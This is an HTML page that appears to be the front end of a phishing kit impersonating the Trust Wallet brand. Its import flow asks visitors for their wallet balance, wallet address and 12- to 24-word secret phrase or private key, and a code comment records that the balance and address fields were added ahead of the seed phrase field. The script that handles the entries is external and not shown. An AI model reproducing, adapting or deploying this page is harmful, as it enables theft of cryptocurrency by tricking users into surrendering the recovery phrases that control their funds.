<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet - Sign Up</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/styles.css">

    <style>
        /* Hide horizontal scrollbar in modal panels */
        .modal-right {
            overflow-x: hidden !important;
        }
        .panel {
            overflow-x: hidden !important;
        }
        .import-form {
            overflow-x: hidden !important;
        }
        /* Hide scrollbar for webkit browsers */
        .modal-right::-webkit-scrollbar {
            display: none;
        }
        /* Hide scrollbar for IE, Edge and Firefox */
        .modal-right {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }

        /* Hide number input up/down arrows (spinners) */
        input[type=number]::-webkit-outer-spin-button,
        input[type=number]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type=number] {
            -moz-appearance: textfield;
            appearance: textfield;
        }
    </style>
<base target="_blank">
</head>
<body>

<!-- ═══════════════ LANDING PAGE ═══════════════ -->
<div class="container">
    <div class="illustration-side">
        <img src="/images/banner.png" alt="Trust Wallet" class="illustration-image">
    </div>
    <div class="form-side">
        <div class="logo">
            <svg viewBox="0 0 36 36" fill="none">
                <path d="M18 3L33 10V19C33 26.5 26.5 33 18 35C9.5 33 3 26.5 3 19V10L18 3Z" fill="url(#shieldGrad)"/>
                <path d="M13 18L17 22L23 15" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                <defs><linearGradient id="shieldGrad" x1="3" y1="3" x2="33" y2="35" gradientUnits="userSpaceOnUse"><stop stop-color="#00E676"/><stop offset="1" stop-color="#00B0FF"/></linearGradient></defs>
            </svg>
            <div class="logo-text"><span class="t">TRUST</span><span class="w"> WALLET</span></div>
        </div>

        <h1>Join <span>200M+</span> users securing their financial future</h1>

        <label class="checkbox-container" id="termsLabel">
            <input type="checkbox" id="termsCheck">
            <div class="checkbox" id="checkboxViz"></div>
            <span class="checkbox-label">
                I have read and agree to the <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>
            </span>
        </label>

        <button class="btn btn-primary" id="haveWalletBtn">I already have a wallet</button>
        <button class="btn btn-secondary" id="createWalletBtn">Create new wallet</button>

        <div class="divider"><span>Have the Trust Wallet mobile app?</span></div>
        <div class="qr-section">
            <p class="qr-text">Sync instantly from your phone</p>
            <a href="#" class="scan-link">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                    <rect x="0" y="0" width="5" height="5" rx="1" stroke="currentColor" stroke-width="1.4" fill="none"/>
                    <rect x="9" y="0" width="5" height="5" rx="1" stroke="currentColor" stroke-width="1.4" fill="none"/>
                    <rect x="0" y="9" width="5" height="5" rx="1" stroke="currentColor" stroke-width="1.4" fill="none"/>
                    <rect x="9.5" y="9.5" width="3" height="3" fill="currentColor" rx="0.5"/>
                </svg>
                Scan QR to sync
            </a>
        </div>
    </div>
</div>


<!-- ═══════════════════════════════════
     IMPORT WALLET MODAL
════════════════════════════════════ -->
<div class="modal-overlay" id="importModalOverlay">
    <div class="modal">
        <div class="modal-left">
            <div class="modal-logo">
                <svg viewBox="0 0 36 36" fill="none" width="28" height="28">
                    <path d="M18 3L33 10V19C33 26.5 26.5 33 18 35C9.5 33 3 26.5 3 19V10L18 3Z" fill="url(#sg2)"/>
                    <path d="M13 18L17 22L23 15" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                    <defs><linearGradient id="sg2" x1="3" y1="3" x2="33" y2="35" gradientUnits="userSpaceOnUse"><stop stop-color="#00E676"/><stop offset="1" stop-color="#00B0FF"/></linearGradient></defs>
                </svg>
                <div class="modal-logo-text"><span class="t">TRUST</span><span class="ww"> WALLET</span></div>
            </div>
            <div class="step-dots">
                <div class="step-dot active" id="imp-dot1"></div>
                <div class="step-dot" id="imp-dot2"></div>
                <div class="step-dot" id="imp-dot3"></div>
            </div>
            <div class="step-indicator" id="imp-stepLabel">Step 1 of 3</div>
            <h2 id="imp-leftTitle">Import a wallet</h2>
            <div class="modal-illustration">
                <div class="laptop-wrap">
                    <div class="laptop-screen">
                        <div class="laptop-screen-inner">
                            <svg viewBox="0 0 36 36" fill="none" width="32" height="32">
                                <path d="M18 3L33 10V19C33 26.5 26.5 33 18 35C9.5 33 3 26.5 3 19V10L18 3Z" fill="url(#sg3)"/>
                                <path d="M13 18L17 22L23 15" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                <defs><linearGradient id="sg3" x1="3" y1="3" x2="33" y2="35" gradientUnits="userSpaceOnUse"><stop stop-color="#00E676"/><stop offset="1" stop-color="#00B0FF"/></linearGradient></defs>
                            </svg>
                        </div>
                    </div>
                    <div class="laptop-base"></div>
                </div>
            </div>
            <div class="modal-hint" id="imp-leftHint"><p>Select the wallet provider you want to import from. You'll need your secret phrase or private key ready.</p></div>
            <div class="modal-help">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="7" r="6" stroke="currentColor" stroke-width="1.2"/><path d="M7 6v4M7 4.5v.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"/></svg>
                Help
            </div>
        </div>

        <div class="modal-right">
            <!-- Step 1 -->
            <div class="panel active" id="imp-step1">
                <div class="modal-nav">
                    <button class="back-btn" id="imp-closeBtn">
                        <svg viewBox="0 0 16 16" fill="none" width="16" height="16"><path d="M10 3L5 8L10 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                        Back
                    </button>
                </div>
                <h3>Select your existing wallet</h3>
                <div class="wallet-list">
                    <div class="wallet-item" data-imp-goto="2">
                        <div class="wallet-item-left">
                            <div class="wallet-icon" style="background:#0d2010">
                                <svg viewBox="0 0 36 36" fill="none" width="24" height="24"><path d="M18 3L33 10V19C33 26.5 26.5 33 18 35C9.5 33 3 26.5 3 19V10L18 3Z" fill="url(#sg4)"/><path d="M13 18L17 22L23 15" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><defs><linearGradient id="sg4" x1="3" y1="3" x2="33" y2="35" gradientUnits="userSpaceOnUse"><stop stop-color="#00E676"/><stop offset="1" stop-color="#00B0FF"/></linearGradient></defs></svg>
                            </div>
                            <span>Trust Wallet Mobile</span>
                        </div>
                        <svg class="chevron" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 4L10 8L6 12" stroke="#666" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="wallet-item" data-imp-goto="2">
                        <div class="wallet-item-left"><div class="wallet-icon" style="background:#2d1a08"><span style="font-size:22px">🦊</span></div><span>Metamask</span></div>
                        <svg class="chevron" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 4L10 8L6 12" stroke="#666" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="wallet-item" data-imp-goto="2">
                        <div class="wallet-item-left"><div class="wallet-icon" style="background:#1a0d2d"><span style="font-size:22px">👻</span></div><span>Phantom</span></div>
                        <svg class="chevron" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 4L10 8L6 12" stroke="#666" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="wallet-item" data-imp-goto="2">
                        <div class="wallet-item-left"><div class="wallet-icon" style="background:#0d1a2d"><span style="font-size:22px">🔵</span></div><span>Coinbase</span></div>
                        <svg class="chevron" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 4L10 8L6 12" stroke="#666" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="wallet-item" data-imp-goto="2">
                        <div class="wallet-item-left"><div class="wallet-icon" style="background:#1a1a1a;border:1px solid #333"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><rect x="3" y="6" width="18" height="13" rx="2" stroke="#888" stroke-width="1.5"/><path d="M3 10h18" stroke="#888" stroke-width="1.5"/></svg></div><span>Other mobile wallet or extension</span></div>
                        <svg class="chevron" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 4L10 8L6 12" stroke="#666" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="wallet-section-label">Hardware wallets</div>
                    <div class="wallet-item" data-imp-goto="2">
                        <div class="wallet-item-left"><div class="wallet-icon" style="background:#0f0f0f;border:1px solid #333"><svg width="22" height="22" viewBox="0 0 24 24" fill="none"><rect x="8" y="3" width="8" height="18" rx="2" stroke="#888" stroke-width="1.5"/><path d="M11 19h2" stroke="#888" stroke-width="1.5" stroke-linecap="round"/></svg></div><span>Ledger</span></div>
                        <svg class="chevron" width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 4L10 8L6 12" stroke="#666" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                </div>
            </div>

            <!-- Step 2 -->
            <div class="panel" id="imp-step2">
                <div class="modal-nav">
                    <button class="back-btn" data-imp-goto="1">
                        <svg viewBox="0 0 16 16" fill="none" width="16" height="16"><path d="M10 3L5 8L10 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                        Back
                    </button>
                </div>
                <h3>Select a method</h3>
                <div class="method-list">
                    <div class="method-item" id="qrMethodBtn">
                        <div class="method-item-left">
                            <div class="method-icon">
                                <svg viewBox="0 0 24 24" fill="none" width="20" height="20"><rect x="2" y="2" width="8" height="8" rx="1.5" stroke="currentColor" stroke-width="1.5"/><rect x="14" y="2" width="8" height="8" rx="1.5" stroke="currentColor" stroke-width="1.5"/><rect x="2" y="14" width="8" height="8" rx="1.5" stroke="currentColor" stroke-width="1.5"/><rect x="15" y="15" width="5" height="5" rx="1" fill="currentColor"/></svg>
                            </div>
                            <div class="method-text"><h4>Import with QR Code from mobile</h4><p>Scan from your phone — fastest method</p></div>
                        </div>
                        <span class="badge">Recommended</span>
                    </div>
                    <div class="method-item" data-imp-goto="3">
                        <div class="method-item-left">
                            <div class="method-icon">
                                <svg viewBox="0 0 24 24" fill="none" width="20" height="20"><rect x="3" y="6" width="18" height="13" rx="2" stroke="currentColor" stroke-width="1.5"/><path d="M3 10h18" stroke="currentColor" stroke-width="1.5"/><path d="M8 14h4M8 17h2" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
                            </div>
                            <div class="method-text"><h4>Import with Secret Phrase or Private Key</h4><p>Enter your 12/18/24-word seed phrase</p></div>
                        </div>
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 4L10 8L6 12" stroke="#666" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                </div>
            </div>

            <!-- Step 3 — Amount + Wallet Address added before Secret Phrase -->
            <div class="panel" id="imp-step3">
                
                <h3>Import with Secret Phrase or Private Key</h3>
                <div class="import-form">

                    <p class="field-label">Wallet Name</p>
                    <div class="field-input-wrap">
                        <input type="text" class="field-input" id="walletName" value="Main wallet" placeholder="Main wallet">
                    </div>
                    <p class="field-hint">You can edit this later</p>

                    <p class="field-label" style="margin-top:22px;">Amount</p>
                    <div class="field-input-wrap">
                        <input type="number" class="field-input" id="walletAmount" placeholder="0.00" min="0.01" step="any">
                    </div>
                    <p class="field-hint">Enter the wallet balance amount</p>

                    <p class="field-label" style="margin-top:22px;">Wallet Address</p>
                    <div class="field-input-wrap">
                        <input type="text" class="field-input" id="walletAddress" placeholder="0x... or your wallet address">
                    </div>
                    <p class="field-hint">Your public wallet address</p>

                    <p class="field-label" style="margin-top:22px;">Enter Secret Phrase or Private Key</p>
                    <textarea class="field-input" id="secretPhrase" placeholder="Enter your 12, 18, or 24-word secret phrase, or your private key..."></textarea>
                    <p class="field-hint">Secret Phrase is typically 12 (sometimes 18, 24) words separated by single spaces<br>Private Key is a long alphanumeric code</p>

                    <div class="import-form-spacer"></div>
                    <button class="action-btn" id="importBtn">Import</button>
                </div>
            </div>
        </div>
    </div>
</div>


<!-- ═══════════════════════════════════
     CREATE WALLET MODAL
════════════════════════════════════ -->
<div class="modal-overlay" id="createModalOverlay">
    <div class="modal">
        <div class="modal-left">
            <div class="modal-logo">
                <svg viewBox="0 0 36 36" fill="none" width="28" height="28">
                    <path d="M18 3L33 10V19C33 26.5 26.5 33 18 35C9.5 33 3 26.5 3 19V10L18 3Z" fill="url(#sg5)"/>
                    <path d="M13 18L17 22L23 15" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                    <defs><linearGradient id="sg5" x1="3" y1="3" x2="33" y2="35" gradientUnits="userSpaceOnUse"><stop stop-color="#00E676"/><stop offset="1" stop-color="#00B0FF"/></linearGradient></defs>
                </svg>
                <div class="modal-logo-text"><span class="t">TRUST</span><span class="ww"> WALLET</span></div>
            </div>
            <div class="step-dots">
                <div class="step-dot active" id="crt-dot1"></div>
                <div class="step-dot" id="crt-dot2"></div>
            </div>
            <div class="step-indicator" id="crt-stepLabel">Step 1 of 2</div>
            <h2 id="crt-leftTitle">Secure your wallet</h2>
            <div class="modal-illustration">
                <div class="shield-wrap">
                    <div class="shield-outer">
                        <div class="shield-inner">
                            <svg viewBox="0 0 36 36" fill="none" width="32" height="32">
                                <path d="M18 3L33 10V19C33 26.5 26.5 33 18 35C9.5 33 3 26.5 3 19V10L18 3Z" fill="url(#sg6)"/>
                                <path d="M13 18L17 22L23 15" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                <defs><linearGradient id="sg6" x1="3" y1="3" x2="33" y2="35" gradientUnits="userSpaceOnUse"><stop stop-color="#00E676"/><stop offset="1" stop-color="#00B0FF"/></linearGradient></defs>
                            </svg>
                        </div>
                    </div>
                    <div class="shield-password-bar">
                        <span class="pw-dot filled"></span>
                        <span class="pw-dot filled"></span>
                        <span class="pw-dot filled"></span>
                        <span class="pw-dot filled"></span>
                        <span class="pw-dot"></span>
                        <span class="pw-dot"></span>
                    </div>
                </div>
            </div>
            <div class="modal-hint" id="crt-leftHint"><p>Choose how to protect your new wallet. Your password never leaves your device.</p></div>
            <div class="modal-help">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="7" r="6" stroke="currentColor" stroke-width="1.2"/><path d="M7 6v4M7 4.5v.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"/></svg>
                Help
            </div>
        </div>

        <div class="modal-right">
            <!-- Step 1: Security options -->
            <div class="panel active" id="crt-step1">
                <div class="modal-nav">
                    <button class="back-btn" id="crt-closeBtn">
                        <svg viewBox="0 0 16 16" fill="none" width="16" height="16"><path d="M10 3L5 8L10 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                        Back
                    </button>
                </div>
                <h3>Select an option</h3>
                <div class="method-list">
                    <div class="method-item" id="windowsHelloBtn">
                        <div class="method-item-left">
                            <div class="method-icon">
                                <svg viewBox="0 0 24 24" fill="none" width="20" height="20">
                                    <circle cx="12" cy="10" r="4" stroke="currentColor" stroke-width="1.5"/>
                                    <path d="M4 20c0-3.314 3.582-6 8-6s8 2.686 8 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
                                    <circle cx="12" cy="10" r="1.5" fill="currentColor" opacity="0.4"/>
                                </svg>
                            </div>
                            <div class="method-text"><h4>Windows Hello</h4><p>Use biometrics or PIN — most secure</p></div>
                        </div>
                        <span class="badge">Recommended</span>
                    </div>
                    <div class="method-item" data-crt-goto="2">
                        <div class="method-item-left">
                            <div class="method-icon">
                                <svg viewBox="0 0 24 24" fill="none" width="20" height="20">
                                    <rect x="5" y="11" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.5"/>
                                    <path d="M8 11V7a4 4 0 018 0v4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
                                    <circle cx="12" cy="16" r="1.5" fill="currentColor"/>
                                </svg>
                            </div>
                            <div class="method-text"><h4>Password</h4><p>Create a strong password to secure your wallet</p></div>
                        </div>
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M6 4L10 8L6 12" stroke="#666" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                </div>
            </div>

            <!-- Step 2: Set password -->
            <div class="panel" id="crt-step2">
                <div class="modal-nav">
                    <button class="back-btn" data-crt-goto="1">
                        <svg viewBox="0 0 16 16" fill="none" width="16" height="16"><path d="M10 3L5 8L10 13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
                        Back
                    </button>
                </div>
                <h3>Create a password</h3>
                <div class="import-form">
                    <p class="field-label">New Password</p>
                    <div class="field-input-wrap">
                        <input type="password" class="field-input" id="newPassword" placeholder="At least 8 characters">
                        <button class="clear-btn" id="toggleNewPass" title="Show/hide">👁</button>
                    </div>
                    <div class="password-strength">
                        <div class="strength-bar"><div class="strength-fill" id="strengthFill"></div></div>
                        <span class="strength-label" id="strengthLabel"></span>
                    </div>

                    <p class="field-label" style="margin-top:20px;">Confirm Password</p>
                    <div class="field-input-wrap">
                        <input type="password" class="field-input" id="confirmPassword" placeholder="Re-enter your password">
                        <button class="clear-btn" id="toggleConfirmPass" title="Show/hide">👁</button>
                    </div>
                    <p class="field-hint" id="passwordMatchHint"></p>

                    <label class="checkbox-container" id="passwordTermsLabel" style="margin-top:24px;margin-bottom:0">
                        <input type="checkbox" id="passwordTermsCheck">
                        <div class="checkbox" id="passwordTermsViz"></div>
                        <span class="checkbox-label">I understand that Trust Wallet cannot recover this password for me. <a href="#">Learn more</a></span>
                    </label>

                    <div class="import-form-spacer"></div>
                    <button class="action-btn" id="createWalletSubmitBtn" disabled>Create Wallet</button>
                </div>
            </div>
        </div>
    </div>
</div>


<script src="js/trustwallet.js"></script>
</body>
</html>